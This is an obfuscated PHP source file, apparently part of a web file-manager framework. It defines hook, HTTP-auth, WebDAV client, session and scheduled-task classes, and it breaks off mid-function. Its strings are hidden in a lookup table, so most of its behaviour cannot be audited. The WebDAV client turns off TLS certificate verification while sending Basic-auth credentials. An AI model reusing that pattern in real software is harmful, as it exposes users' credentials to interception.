<?php
 goto déššÂ­ºó; FÀ‰ ùñ¶: class Hook { private static $events = array(); public static function get($F™É»¿ÆÒ = false) { if (!$F™É»¿ÆÒ) { return self::$events; } else { return self::$events[$F™É»¿ÆÒ]; } } public static function apply($d‰¦¡ÜÒ, $B„³Ü——‚ = array()) { $BÃˆÁø§ÈŠ = ActionApply($d‰¦¡ÜÒ, $B„³Ü——‚); if (is_string($d‰¦¡ÜÒ)) { Hook::trigger($d‰¦¡ÜÒ); } return $BÃˆÁø§ÈŠ; } public static function bind($cóĞÓÊÁ, $F‘„†ÇØ”ß, $a†ŒÔ„ÕÁæ = false) { $dŸ÷ö¹ïíğ =& $_SERVER[İë¬“ÅÒÛ›]; if (!isset(self::$events[$cóĞÓÊÁ])) { self::$events[$cóĞÓÊÁ] = array(); } self::$events[$cóĞÓÊÁ][] = array($dŸ÷ö¹ïíğ[1178] => $F‘„†ÇØ”ß, $dŸ÷ö¹ïíğ[1179] => $a†ŒÔ„ÕÁæ, $dŸ÷ö¹ïíğ[1180] => 0); } public static function once($a‘ï´¤—ô, $c˜ÍÀ… ¬”) { self::bind($a‘ï´¤—ô, $c˜ÍÀ… ¬”, !0); } public static function unbind($cì•İ¼˜¨Ó, $D‡Ş›”ß = false) { if (!$D‡Ş›”ß) { self::$events[$cì•İ¼˜¨Ó] = array(); return; } $D ˜•©»’õ = self::$events[$cì•İ¼˜¨Ó]; self::$events[$cì•İ¼˜¨Ó] = array(); for ($d’«ÈéãÔ  = 0; $d’«ÈéãÔ  < count($D ˜•©»’õ); $d’«ÈéãÔ ++) { if ($D ˜•©»’õ[$d’«ÈéãÔ ][$_SERVER[İë¬“ÅÒÛ›][1178]] == $D‡Ş›”ß) { continue; } self::$events[$cì•İ¼˜¨Ó][] = $D ˜•©»’õ[$d’«ÈéãÔ ]; } } public static function filter($dªÓ’ôãÏ, $E‰°õ‹¨ª) { goto EÄ“êŸ²‡î; Cß…åù¹„: $B“†éÃ© = $F‹Á÷–›À[$dªÓ’ôãÏ]; $b„êÌ§”ªÇ = $E‰°õ‹¨ª; if (!is_array($B“†éÃ©) || count($B“†éÃ©) == 0) { return $b„êÌ§”ªÇ; } goto dİ¼¬¾•¢¸; EÄ“êŸ²‡î: $Fˆ™¯Şö¡Æ =& $_SERVER[İë¬“ÅÒÛ›]; $F‹Á÷–›À = self::$events; if (!isset($F‹Á÷–›À[$dªÓ’ôãÏ])) { return $E‰°õ‹¨ª; } goto Cß…åù¹„; dİ¼¬¾•¢¸: for ($EÀÁ„º†Ã„ = 0; $EÀÁ„º†Ã„ < count($B“†éÃ©); $EÀÁ„º†Ã„++) { $f‡¹Ó£ô„ = $B“†éÃ©[$EÀÁ„º†Ã„]; if ($f‡¹Ó£ô„[$Fˆ™¯Şö¡Æ[1179]] && $f‡¹Ó£ô„[$Fˆ™¯Şö¡Æ[1180]] > 1) { continue; } self::$events[$dªÓ’ôãÏ][$EÀÁ„º†Ã„][$Fˆ™¯Şö¡Æ[1180]] = $f‡¹Ó£ô„[$Fˆ™¯Şö¡Æ[1180]] + 1; $fáù²å¤í¹ = self::apply($f‡¹Ó£ô„[$Fˆ™¯Şö¡Æ[1178]], array($b„êÌ§”ªÇ)); if (!is_null($fáù²å¤í¹)) { $b„êÌ§”ªÇ = $fáù²å¤í¹; } } return $b„êÌ§”ªÇ; goto AÓ½‡Ãµ¥¨; AÓ½‡Ãµ¥¨: } public static function trigger($b‰•ƒâ¥Œğ) { goto Eô’¬ç¬¥ß; Eô’¬ç¬¥ß: $AœôÏòŠ¸ =& $_SERVER[İë¬“ÅÒÛ›]; $aš³À±¬• = self::$events; $E˜‹Œ¾ÖËò = !1; goto DåŒ•É’µñ; DåŒ•É’µñ: if (!isset($aš³À±¬•[$b‰•ƒâ¥Œğ])) { return $E˜‹Œ¾ÖËò; } $C›ğ‘¡äñÛ = $aš³À±¬•[$b‰•ƒâ¥Œğ]; if (!is_array($C›ğ‘¡äñÛ) || count($C›ğ‘¡äñÛ) == 0) { return $E˜‹Œ¾ÖËò; } goto FÑÂÒ¬®Š­; dÏ÷ê¹ËÙ«: return $E˜‹Œ¾ÖËò; goto D–­ßí„æï; FÑÂÒ¬®Š­: $EÛÍŒÀô¸Æ = func_get_args(); array_shift($EÛÍŒÀô¸Æ); for ($Dš¬½¾äî = 0; $Dš¬½¾äî < count($C›ğ‘¡äñÛ); $Dš¬½¾äî++) { $c¢ã“Ä¡³Ô = $C›ğ‘¡äñÛ[$Dš¬½¾äî]; if ($c¢ã“Ä¡³Ô[$AœôÏòŠ¸[1179]] && $c¢ã“Ä¡³Ô[$AœôÏòŠ¸[1180]] > 1) { continue; } if (defined($AœôÏòŠ¸[1181]) && GLOBAL_LOG_HOOK) { write_log($b‰•ƒâ¥Œğ . $AœôÏòŠ¸[1182] . $c¢ã“Ä¡³Ô[$AœôÏòŠ¸[1178]], $AœôÏòŠ¸[1183]); } self::$events[$b‰•ƒâ¥Œğ][$Dš¬½¾äî][$AœôÏòŠ¸[1180]] = $c¢ã“Ä¡³Ô[$AœôÏòŠ¸[1180]] + 1; $aÈÈ×‰ÀĞ = self::apply($c¢ã“Ä¡³Ô[$AœôÏòŠ¸[1178]], $EÛÍŒÀô¸Æ); if (defined($AœôÏòŠ¸[1181]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $AœôÏòŠ¸[1183]); if ($c¢ã“Ä¡³Ô[$AœôÏòŠ¸[1180]] == 200) { $F„êŒÅÁë = is_array($c¢ã“Ä¡³Ô[$AœôÏòŠ¸[1178]]) ? json_encode_force($c¢ã“Ä¡³Ô[$AœôÏòŠ¸[1178]]) : $c¢ã“Ä¡³Ô[$AœôÏòŠ¸[1178]]; write_log($AœôÏòŠ¸[1184] . $b‰•ƒâ¥Œğ . $AœôÏòŠ¸[1185] . $F„êŒÅÁë, $AœôÏòŠ¸[1186]); } } $E˜‹Œ¾ÖËò = is_null($aÈÈ×‰ÀĞ) ? $E˜‹Œ¾ÖËò : $aÈÈ×‰ÀĞ; } goto dÏ÷ê¹ËÙ«; D–­ßí„æï: } } class HttpAuth { public static function get() { $bÔôÃÒµÛ =& $_SERVER[İë¬“ÅÒÛ›]; $DÅ¹Ş§œ°÷ = $bÔôÃÒµÛ[33]; $BŸ‹ÍµÄ¼² = $bÔôÃÒµÛ[33]; if (isset($_SERVER[$bÔôÃÒµÛ[1187]])) { $DÅ¹Ş§œ°÷ = $_SERVER[$bÔôÃÒµÛ[1187]]; $BŸ‹ÍµÄ¼² = $_SERVER[$bÔôÃÒµÛ[1188]]; } elseif (isset($_SERVER[$bÔôÃÒµÛ[1189]])) { $e‡å‚÷Ùë = $_SERVER[$bÔôÃÒµÛ[1189]]; if (strpos(strtolower($e‡å‚÷Ùë), $bÔôÃÒµÛ[1190]) === 0) { $eĞÉï‹å„ = explode($bÔôÃÒµÛ[4], base64_decode(substr($e‡å‚÷Ùë, 6))); $DÅ¹Ş§œ°÷ = isset($eĞÉï‹å„[0]) ? $eĞÉï‹å„[0] : $bÔôÃÒµÛ[33]; $BŸ‹ÍµÄ¼² = isset($eĞÉï‹å„[1]) ? $eĞÉï‹å„[1] : 0; } } return array($bÔôÃÒµÛ[417] => $DÅ¹Ş§œ°÷, $bÔôÃÒµÛ[667] => $BŸ‹ÍµÄ¼²); } public static function error() { goto aºß¶ßÒØ‹; b£ÈÄ©‘³Ì: header($Cß„¼–Òá[1193]); header($Cß„¼–Òá[1194]); header($Cß„¼–Òá[1195]); goto a‰‚‹ç«; aºß¶ßÒØ‹: $Cß„¼–Òá =& $_SERVER[İë¬“ÅÒÛ›]; header($Cß„¼–Òá[1191]); header($Cß„¼–Òá[1192]); goto b£ÈÄ©‘³Ì; a‰‚‹ç«: die; goto fäï×¸ŒÏÓ; fäï×¸ŒÏÓ: } public static function make($A¤–ŞÜ’ƒ, $A£…¤±äñó) { $BÕÊ´ª‚Ú¢ =& $_SERVER[İë¬“ÅÒÛ›]; return $BÕÊ´ª‚Ú¢[1196] + base64_encode($A¤–ŞÜ’ƒ . $BÕÊ´ª‚Ú¢[4] . $A£…¤±äñó); } } class HttpDavClient { public function __construct($B÷Ï—÷±», $dÁå‡œ½á, $Dœ§ä“¹¨‚) { $this->header = array(); $this->userName = $dÁå‡œ½á; $this->userPassowrd = $Dœ§ä“¹¨‚; } protected function makePath($Cêæã«’Š) { return $Cêæã«’Š; } protected function setHeader($EÖÊÅï¡, $b”Ùô¡ÚŠä = false) { if ($b”Ùô¡ÚŠä === !1) { $this->header[] = $EÖÊÅï¡; } else { $this->header[] = $EÖÊÅï¡ . $_SERVER[İë¬“ÅÒÛ›][650] . $b”Ùô¡ÚŠä; } } public function move($D©î†‘±Ä‚, $A…åóôŠÓ‹, $F…ç²–Ğ‹Î = '') { $A¦äŞÜ¨ìå =& $_SERVER[İë¬“ÅÒÛ›]; $this->setHeader($A¦äŞÜ¨ìå[1197], $this->makePath($A…åóôŠÓ‹)); $this->setHeader($A¦äŞÜ¨ìå[1198], $A¦äŞÜ¨ìå[1199]); if ($F…ç²–Ğ‹Î) { $this->setHeader($A¦äŞÜ¨ìå[1200], $A¦äŞÜ¨ìå[695] . $F…ç²–Ğ‹Î . $A¦äŞÜ¨ìå[698]); } return $this->send($A¦äŞÜ¨ìå[1201], $D©î†‘±Ä‚); } public function copy($Fó¶àŒÊĞ, $a«‘‰ÖÈî) { $aª§ËÏ‡Á =& $_SERVER[İë¬“ÅÒÛ›]; $this->setHeader($aª§ËÏ‡Á[1197], $this->makePath($a«‘‰ÖÈî)); $this->setHeader($aª§ËÏ‡Á[1198], $aª§ËÏ‡Á[1199]); return $this->send($aª§ËÏ‡Á[1202], $Fó¶àŒÊĞ); } public function mkcol($A»òğêÊ¼§) { $e„œäÀ×£ =& $_SERVER[İë¬“ÅÒÛ›]; $this->setHeader($e„œäÀ×£[1198], $e„œäÀ×£[1199]); return $this->send($e„œäÀ×£[1203], $A»òğêÊ¼§); } public function delete($B¡ôÂŸøéÚ, $cŒŠáğ“È = '') { $EÂŠöŒ¯” =& $_SERVER[İë¬“ÅÒÛ›]; if ($cŒŠáğ“È) { $this->setHeader($EÂŠöŒ¯”[1200], $EÂŠöŒ¯”[695] . $cŒŠáğ“È . $EÂŠöŒ¯”[698]); } return $this->send($EÂŠöŒ¯”[1204], $B¡ôÂŸøéÚ); } public function propfind($C¾²Š¦œ•) { $e˜ °ŒŒ„ =& $_SERVER[İë¬“ÅÒÛ›]; $this->setHeader($e˜ °ŒŒ„[1205], $e˜ °ŒŒ„[377]); $this->setHeader($e˜ °ŒŒ„[1206], $e˜ °ŒŒ„[1207]); $CŠéŠ˜ãÑ† = $e˜ °ŒŒ„[1208]; return $this->send($e˜ °ŒŒ„[1209], $C¾²Š¦œ•, $CŠéŠ˜ãÑ†); } public function options($F«³‰Œ¢ğÉ) { return $this->send($_SERVER[İë¬“ÅÒÛ›][1210], $F«³‰Œ¢ğÉ); } public function get($B»Ò©ïœù¿) { return $this->send($_SERVER[İë¬“ÅÒÛ›][223], $B»Ò©ïœù¿); } public function put($EƒôÁó¯†ô, $F¦İ²ŞÅ, $e¥ƒÂÀö½À = '') { $BÚò«È›Æ¶ =& $_SERVER[İë¬“ÅÒÛ›]; if ($e¥ƒÂÀö½À) { $this->setHeader($BÚò«È›Æ¶[1200], $BÚò«È›Æ¶[695] . $e¥ƒÂÀö½À . $BÚò«È›Æ¶[698]); } return $this->send($BÚò«È›Æ¶[221], $EƒôÁó¯†ô, $F¦İ²ŞÅ); } protected function send($fèé÷Øêî, $BŸ«·§÷Òé, $E¡’ßŠõô° = false, $cõƒ¥ÃÏŒñ = false) { goto d±—ÜºùÀ; E¼˜ÔãÆ’: $this->setHeader($fœ‚ºÃª£©); if ($E¡’ßŠõô°) { $E¡’ßŠõô° = $fÌŒŒ™é‰[1212] . $E¡’ßŠõô°; } if (!request_url_safe($BŸ«·§÷Òé)) { return !1; } goto f‡Çº•ç¨«; CØå‘¼„ˆÆ: curl_setopt($FÇ÷ùÜˆ, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($FÇ÷ùÜˆ, CURLOPT_SSL_VERIFYHOST, !1); $Eİ¯¨˜Î‡¥ = curl_exec($FÇ÷ùÜˆ); goto dÑÄ±ë®µ; d±—ÜºùÀ: $fÌŒŒ™é‰ =& $_SERVER[İë¬“ÅÒÛ›]; $fœ‚ºÃª£© = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($fÌŒŒ™é‰[1211], $fÌŒŒ™é‰[50]); goto E¼˜ÔãÆ’; f‡Çº•ç¨«: $FÇ÷ùÜˆ = curl_init($BŸ«·§÷Òé); curl_setopt($FÇ÷ùÜˆ, CURLOPT_CUSTOMREQUEST, $fèé÷Øêî); curl_setopt($FÇ÷ùÜˆ, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto a³Ï¦¾ë°é; dÑÄ±ë®µ: $this->header = array(); return $Eİ¯¨˜Î‡¥; goto bïÏšÏ÷Ÿ; a³Ï¦¾ë°é: curl_setopt($FÇ÷ùÜˆ, CURLOPT_HTTPHEADER, $this->header); curl_setopt($FÇ÷ùÜˆ, CURLOPT_RETURNTRANSFER, !0); curl_setopt($FÇ÷ùÜˆ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto CØå‘¼„ˆÆ; bïÏšÏ÷Ÿ: } } goto AÏ”ßÚ‰ªµ; d«»¦Ò¥•§: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto bì™éËæ»; bì™éËæ»: $D¥Ä¦òÉÕ =& $_SERVER[İë¬“ÅÒÛ›]; static $aØõíŸ°ìÚ = false; if ($aØõíŸ°ìÚ) { return $aØõíŸ°ìÚ; } goto F§ÖÇñŒÙ…; F§ÖÇñŒÙ…: $cæ‘Å†‘Ò™ = $GLOBALS[$D¥Ä¦òÉÕ[6]][$D¥Ä¦òÉÕ[341]]; self::$sessionTime = $cæ‘Å†‘Ò™[$D¥Ä¦òÉÕ[1057]]; if (self::$sessionSign) { } else { if (Cookie::get(SESSION_ID)) { self::$sessionSign = Cookie::get(SESSION_ID); } else { self::$sessionSign = guid(); } } goto DÙ¤¬Àòš; DÙ¤¬Àòš: Cookie::setSafe(SESSION_ID, self::$sessionSign, self::$sessionTime); $E®ëÍ„é• = $cæ‘Å†‘Ò™[$D¥Ä¦òÉÕ[1058]]; $E·ì…‘àâ„ = $cæ‘Å†‘Ò™[$E®ëÍ„é•]; goto c®­Ö­Ø­‰; Føƒ°©âÈ: $aØõíŸ°ìÚ = new self(); return $aØõíŸ°ìÚ; goto d‘Ó™Ï®•ù; c®­Ö­Ø­‰: $añòˆ„‰Ş¸ = $cæ‘Å†‘Ò™[$D¥Ä¦òÉÕ[524]]; switch ($E®ëÍ„é•) { case $D¥Ä¦òÉÕ[17]: self::$handle = Model($D¥Ä¦òÉÕ[525]); break; case $D¥Ä¦òÉÕ[526]: self::$handle = new CacheRedis($E·ì…‘àâ„, $añòˆ„‰Ş¸); break; case $D¥Ä¦òÉÕ[527]: self::$handle = new CacheMemcached($E·ì…‘àâ„, $añòˆ„‰Ş¸); break; case $D¥Ä¦òÉÕ[164]: $E·ì…‘àâ„[$D¥Ä¦òÉÕ[76]] = $E·ì…‘àâ„[$D¥Ä¦òÉÕ[76]] . $D¥Ä¦òÉÕ[1059]; self::$handle = new CacheFile($E·ì…‘àâ„, $añòˆ„‰Ş¸); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } goto Føƒ°©âÈ; d‘Ó™Ï®•ù: } public static function sign($b×¯ÆØá‹‘ = false) { $b×¯ÆØá‹‘ && (self::$sessionSign = $b×¯ÆØá‹‘); self::init(); return self::$sessionSign; } public static function set($Eæ‘¢“æ, $FÎê¡©àˆ = false) { self::init(); if (is_array($Eæ‘¢“æ)) { foreach ($Eæ‘¢“æ as $AÇîñà×Š => $DĞ˜Âø£òñ) { array_set_value(self::$data, $AÇîñà×Š, $DĞ˜Âø£òñ); } } else { array_set_value(self::$data, $Eæ‘¢“æ, $FÎê¡©àˆ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($cà™ºÊ´ŠŞ = false) { self::init(); if (!$cà™ºÊ´ŠŞ) { return self::$data; } return array_get_value(self::$data, $cà™ºÊ´ŠŞ); } public static function remove($BÆø¥ÖÛ¢Ğ) { self::init(); unset(self::$data[$BÆø¥ÖÛ¢Ğ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[İë¬“ÅÒÛ›][529])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto Cìï±¸Ùå; C²§×‘Õ•©: while (!0) { self::cacheClear(); if (self::valueGet($DÅœ—ÉÖÒ[447]) != $DÅœ—ÉÖÒ[377]) { self::valueSet($DÅœ—ÉÖÒ[1060], $DÅœ—ÉÖÒ[403]); self::log($DÅœ—ÉÖÒ[1064]); die; } self::valueSet($DÅœ—ÉÖÒ[1060], $DÅœ—ÉÖÒ[377]); self::valueSet($DÅœ—ÉÖÒ[1061], time()); self::taskRunAll(); sleep(self::valueGet($DÅœ—ÉÖÒ[1065])); } goto E¨¡Ñ·½˜; D¹“ñÎ²¸Á: http_close(); self::valueSet($DÅœ—ÉÖÒ[1060], $DÅœ—ÉÖÒ[377]); Hook::bind($DÅœ—ÉÖÒ[1062], $DÅœ—ÉÖÒ[1063]); goto C²§×‘Õ•©; Cìï±¸Ùå: $DÅœ—ÉÖÒ =& $_SERVER[İë¬“ÅÒÛ›]; if (self::valueGet($DÅœ—ÉÖÒ[447]) != $DÅœ—ÉÖÒ[377]) { return; } if (self::valueGet($DÅœ—ÉÖÒ[1060]) == $DÅœ—ÉÖÒ[377]) { $bƒ‚Î¬ïÌ = self::valueGet($DÅœ—ÉÖÒ[1061]); if (time() - $bƒ‚Î¬ïÌ > 3600 * 2) { self::restart(); } return; } goto D¹“ñÎ²¸Á; E¨¡Ñ·½˜: } public static function restart() { $d³Ù¾œŸ„¢ =& $_SERVER[İë¬“ÅÒÛ›]; http_close(); self::valueSet($d³Ù¾œŸ„¢[447], $d³Ù¾œŸ„¢[403]); sleep(self::valueGet($d³Ù¾œŸ„¢[1065]) + 5); self::valueSet($d³Ù¾œŸ„¢[1060], $d³Ù¾œŸ„¢[403]); self::valueSet($d³Ù¾œŸ„¢[447], $d³Ù¾œŸ„¢[377]); } public static function shutdownEvent() { $f¹©Ó†ù‰Ò =& $_SERVER[İë¬“ÅÒÛ›]; self::valueSet($f¹©Ó†ù‰Ò[1060], $f¹©Ó†ù‰Ò[403]); self::log($f¹©Ó†ù‰Ò[1066]); } public static function config($E’ÍÌ¸‘ÏØ, $b‰ÎÔé´–Í) { $a›áñ¢Ş×ù =& $_SERVER[İë¬“ÅÒÛ›]; $aæ«‘ãÊ± = 20; $b‰ÎÔé´–Í = intval($b‰ÎÔé´–Í) <= $aæ«‘ãÊ± ? $aæ«‘ãÊ± : intval($b‰ÎÔé´–Í); self::valueSet($a›áñ¢Ş×ù[447], $E’ÍÌ¸‘ÏØ); self::valueSet($a›áñ¢Ş×ù[1065], $b‰ÎÔé´–Í); } private static function taskRunAll() { $FíÒ‘‘±– =& $_SERVER[İë¬“ÅÒÛ›]; $C´¡ä–ò = Model($FíÒ‘‘±–[1067])->listData(); $cğöÜ¨ù¨ = count($C´¡ä–ò); for ($b“‚²ª÷« = 0; $b“‚²ª÷« < $cğöÜ¨ù¨; $b“‚²ª÷«++) { $a§ãÆåõ¸¢ = $C´¡ä–ò[$b“‚²ª÷«]; if ($a§ãÆåõ¸¢[$FíÒ‘‘±–[1068]] != $FíÒ‘‘±–[377]) { continue; } if (!self::taskTimeCheck($a§ãÆåõ¸¢)) { continue; } self::taskRun($a§ãÆåõ¸¢); } } private static function taskTimeCheck($F˜…à§¹—™) { goto dôØ÷ãÁÏ; DŠ™†ÌØğ³: $E£Á…™ŸÉ = strtotime($Cà…›éÕæë[1069] . $e«ã³Ÿ£î’[$Cà…›éÕæë[1070]] . $Cà…›éÕæë[1071]) - strtotime($Cà…›éÕæë[1072]); $EÏ«œŠÓ—í = time() - strtotime(date($Cà…›éÕæë[1073]) . $Cà…›éÕæë[1074]); $C¯ÀÍùç¤™ = $EÏ«œŠÓ—í >= $E£Á…™ŸÉ && $EÏ«œŠÓ—í <= $E£Á…™ŸÉ + 3600; goto FÏ„ğÚÌò°; FÏ„ğÚÌò°: switch ($e«ã³Ÿ£î’[$Cà…›éÕæë[29]]) { case $Cà…›éÕæë[1075]: if (time() - $a£–ğ’Á»İ < 3600 * 24 * 30) { return !1; } if ($e«ã³Ÿ£î’[$Cà…›éÕæë[1075]] == date($Cà…›éÕæë[1076]) && $C¯ÀÍùç¤™) { return !0; } break; case $Cà…›éÕæë[1077]: if (time() - $a£–ğ’Á»İ < 3600 * 24 * 7) { return !1; } $cŒ´¶ÀĞòÍ = date($Cà…›éÕæë[1078]) == 0 ? 7 : date($Cà…›éÕæë[1078]); if ($e«ã³Ÿ£î’[$Cà…›éÕæë[1077]] == $cŒ´¶ÀĞòÍ && $C¯ÀÍùç¤™) { return !0; } break; case $Cà…›éÕæë[1070]: if (time() - $a£–ğ’Á»İ < 3600 * 24) { return !1; } if ($C¯ÀÍùç¤™) { return !0; } break; case $Cà…›éÕæë[1079]: if (time() - $a£–ğ’Á»İ >= floatval($e«ã³Ÿ£î’[$Cà…›éÕæë[1079]]) * 60) { return !0; } break; default: break; } return !1; goto fà²´œå©‘; dôØ÷ãÁÏ: $Cà…›éÕæë =& $_SERVER[İë¬“ÅÒÛ›]; $e«ã³Ÿ£î’ = json_decode($F˜…à§¹—™[$Cà…›éÕæë[190]], !0); $a£–ğ’Á»İ = intval($F˜…à§¹—™[$Cà…›éÕæë[1061]]); goto DŠ™†ÌØğ³; fà²´œå©‘: } public static function taskRun($b£©““´¥Ê) { goto F®Şó‚¢; C„Ÿ»Š®ËÂ: $F÷¬“—ë = timeFloat(); $e¾«Üñ²Ÿ¾ = $cÌÇ‰É¸‰¨[33]; switch ($b£©““´¥Ê[$cÌÇ‰É¸‰¨[29]]) { case $cÌÇ‰É¸‰¨[299]: $B…ÔçÖŸƒÅ = url_request($b£©““´¥Ê[$cÌÇ‰É¸‰¨[1083]], $cÌÇ‰É¸‰¨[223], !1, !1, !1, !1, 5); $e¾«Üñ²Ÿ¾ = strlen($B…ÔçÖŸƒÅ); break; case $cÌÇ‰É¸‰¨[222]: $e¾«Üñ²Ÿ¾ = Hook::apply($b£©““´¥Ê[$cÌÇ‰É¸‰¨[1083]]); default: break; } goto eöÆ¯ø¾‹; eöÆ¯ø¾‹: Model($cÌÇ‰É¸‰¨[1084])->add(array($cÌÇ‰É¸‰¨[1085] => $cÌÇ‰É¸‰¨[33], $cÌÇ‰É¸‰¨[1086] => $cÌÇ‰É¸‰¨[403], $cÌÇ‰É¸‰¨[29] => $cÌÇ‰É¸‰¨[1087] . $b£©““´¥Ê[$cÌÇ‰É¸‰¨[369]], $cÌÇ‰É¸‰¨[1088] => json_encode(array($cÌÇ‰É¸‰¨[28] => $b£©““´¥Ê[$cÌÇ‰É¸‰¨[28]], $cÌÇ‰É¸‰¨[1089] => timeFloat() - $F÷¬“—ë, $cÌÇ‰É¸‰¨[285] => $e¾«Üñ²Ÿ¾)))); self::log($cÌÇ‰É¸‰¨[1090] . $b£©““´¥Ê[$cÌÇ‰É¸‰¨[369]] . $cÌÇ‰É¸‰¨[1091] . $e¾«Üñ²Ÿ¾); return !0; goto CØ‹‘˜¾…¥; F®Şó‚¢: $cÌÇ‰É¸‰¨ =& $_SERVER[İë¬“ÅÒÛ›]; self::log($cÌÇ‰É¸‰¨[1080] . $b£©““´¥Ê[$cÌÇ‰É¸‰¨[369]] . $cÌÇ‰É¸‰¨[1081] . $b£©““´¥Ê[$cÌÇ‰É¸‰¨[28]] . $cÌÇ‰É¸‰¨[1082] . $b£©““´¥Ê[$cÌÇ‰É¸‰¨[1083]]); Model($cÌÇ‰É¸‰¨[1067])->run($b£©““´¥Ê[$cÌÇ‰É¸‰¨[369]]); goto C„Ÿ»Š®ËÂ; CØ‹‘˜¾…¥: } private static function valueGet($D—®ôÉôÅë) { $CèëƒÜÅÍ‹ =& $_SERVER[İë¬“ÅÒÛ›]; $Bœ¬œÂßÊç = $CèëƒÜÅÍ‹[1092]; $B –ñâÙÆÏ = Model($CèëƒÜÅÍ‹[1093])->get($D—®ôÉôÅë, $Bœ¬œÂßÊç); if (is_null($B –ñâÙÆÏ)) { Model($CèëƒÜÅÍ‹[1093])->set($CèëƒÜÅÍ‹[1065], 10, $Bœ¬œÂßÊç); Model($CèëƒÜÅÍ‹[1093])->set($CèëƒÜÅÍ‹[447], $CèëƒÜÅÍ‹[377], $Bœ¬œÂßÊç); Model($CèëƒÜÅÍ‹[1093])->set($CèëƒÜÅÍ‹[1060], $CèëƒÜÅÍ‹[403], $Bœ¬œÂßÊç); $B –ñâÙÆÏ = Model($CèëƒÜÅÍ‹[1093])->get($D—®ôÉôÅë, $Bœ¬œÂßÊç); } return $B –ñâÙÆÏ; } private static function valueSet($C«¦ö·‰Í, $cÑùêìÄ) { $c„·Ú†àî =& $_SERVER[İë¬“ÅÒÛ›]; return Model($c„·Ú†àî[1093])->set($C«¦ö·‰Í, $cÑùêìÄ, $c„·Ú†àî[1092]); } protected static function log($e¿—õ›È•) { write_log($e¿—õ›È•, $_SERVER[İë¬“ÅÒÛ›][1094]); } private static function cacheClear() { $CğİË¢Œ²Û =& $_SERVER[İë¬“ÅÒÛ›]; $b–¡åÓÃÅ‡ = Model($CğİË¢Œ²Û[1093])->cacheKey($CğİË¢Œ²Û[1092]); Cache::clearMemory($b–¡åÓÃÅ‡); } } class Task { const STATYS_STOP = "\163\x74\157\x70"; const STATYS_RUNNING = "\162\x75\x6e\156\x69\x6e\x67"; const STATYS_KILL = "\x6b\151\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($DêŸŒŠ„ÃŞ, $FÂÍáĞÙ° = '', $d „¬ÇŠá = 0, $eÃÊší“’ô = '') { goto aò£­Ä–ŒÉ; C›·º†ÊŠó: Hook::bind($c¯Üóò« Š[1062], array($this, $c¯Üóò« Š[1106])); Hook::bind($c¯Üóò« Š[1107], array($this, $c¯Üóò« Š[1108])); $this->startAfter(); goto B°ÛñçŒµ; aò£­Ä–ŒÉ: $c¯Üóò« Š =& $_SERVER[İë¬“ÅÒÛ›]; if (self::get($DêŸŒŠ„ÃŞ)) { return; } $this->task = array($c¯Üóò« Š[369] => $DêŸŒŠ„ÃŞ, $c¯Üóò« Š[1095] => USER_ID, $c¯Üóò« Š[1004] => $eÃÊší“’ô, $c¯Üóò« Š[29] => $FÂÍáĞÙ°, $c¯Üóò« Š[1096] => $c¯Üóò« Š[33], $c¯Üóò« Š[1097] => $d „¬ÇŠá, $c¯Üóò« Š[1098] => 0, $c¯Üóò« Š[1099] => 0, $c¯Üóò« Š[1100] => 0, $c¯Üóò« Š[1101] => timeFloat(), $c¯Üóò« Š[1102] => 0, $c¯Üóò« Š[1103] => 0, $c¯Üóò« Š[1104] => 0, $c¯Üóò« Š[1105] => 0, $c¯Üóò« Š[447] => $c¯Üóò« Š[1060]); goto C›·º†ÊŠó; B°ÛñçŒµ: $this->task[$c¯Üóò« Š[1103]] = timeFloat(); self::valueSet($this->task[$c¯Üóò« Š[369]], $this->task); goto E”¥•‡†Ì; E”¥•‡†Ì: } public function end() { goto E“øˆ“È¯; E“øˆ“È¯: $Fƒ¼‰ˆ³£ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$this->task) { return; } if ($this->task[$Fƒ¼‰ˆ³£[1103]]) { self::valueSet($this->task[$Fƒ¼‰ˆ³£[369]], !1); } goto AÚÅŠ§Ü»ù; AÚÅŠ§Ü»ù: $E¢Íá®›ã = timeFloat() - $this->task[$Fƒ¼‰ˆ³£[1101]]; self::log($Fƒ¼‰ˆ³£[1109] . $this->task[$Fƒ¼‰ˆ³£[369]] . $Fƒ¼‰ˆ³£[1110] . $E¢Íá®›ã . $Fƒ¼‰ˆ³£[1111]); Hook::unbind($Fƒ¼‰ˆ³£[1062], array($this, $Fƒ¼‰ˆ³£[1106])); goto cËõ§”‚½°; cËõ§”‚½°: Hook::unbind($Fƒ¼‰ˆ³£[1107], array($this, $Fƒ¼‰ˆ³£[1108])); $this->endAfter(); $this->task = !1; goto Cˆö›çöéœ; Cˆö›çöéœ: } public function update($BÌÀî¤ÎÜ‰ = 0) { goto b­³×¨®•»; eÆÚ²ïÁ¤°: $AÜˆÀâò…¯[$A®–ŠÖÈë¤[1103]] = timeFloat(); self::valueSet($AÜˆÀâò…¯[$A®–ŠÖÈë¤[369]], $AÜˆÀâò…¯); goto bƒè—’³İã; E”Şİ‚õ¥†: if ($dâ®ë›”¯à == self::STATYS_KILL) { $b™ÙŸ‹ğ« = array($A®–ŠÖÈë¤[1112] => LNG($A®–ŠÖÈë¤[1113]), $A®–ŠÖÈë¤[784] => !1); Cache::set($A®–ŠÖÈë¤[1114] . $this->task[$A®–ŠÖÈë¤[369]], $b™ÙŸ‹ğ«, 30); $this->end(); die; } else { if ($dâ®ë›”¯à == self::STATYS_STOP) { $CÑÚÆöÉ’ô = 2; 